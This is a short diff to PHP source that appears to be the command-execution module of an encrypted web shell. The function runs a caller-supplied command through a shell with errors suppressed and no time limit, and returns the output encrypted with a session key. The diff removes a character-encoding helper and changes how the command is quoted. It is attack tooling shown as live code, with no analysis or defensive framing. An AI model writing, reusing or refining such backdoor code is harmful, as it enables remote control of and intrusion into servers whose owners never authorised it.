@@ -1,13 +1,5 @@
 @error_reporting(0);
-function getSafeStr($str){
-    $s1 = iconv('utf-8','gbk//IGNORE',$str);
-    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
-    if($s0 == $str){
-        return $s0;
-    }else{
-        return iconv('gbk','utf-8//IGNORE',$str);
-    }
-}
+
 function main($cmdPath,$exit,$cmd)
 {
     @set_time_limit(0);
@@ -30,7 +22,7 @@ function main($cmdPath,$exit,$cmd)
 	    else{
 	     $isc=" -c ";
 	    }
-		$c = $cmdPath.$isc.$cmd;
+		$c = $cmdPath . $isc . '"' . $cmd . '"';
     }
     else{
     	if($cmd!==""){
@@ -97,7 +89,7 @@ function main($cmdPath,$exit,$cmd)
         return;
         
     }
-    $result = getSafeStr($kWJW);
+    $result = $kWJW;
     echo encrypt($result,  $_SESSION['k']);
 }
 
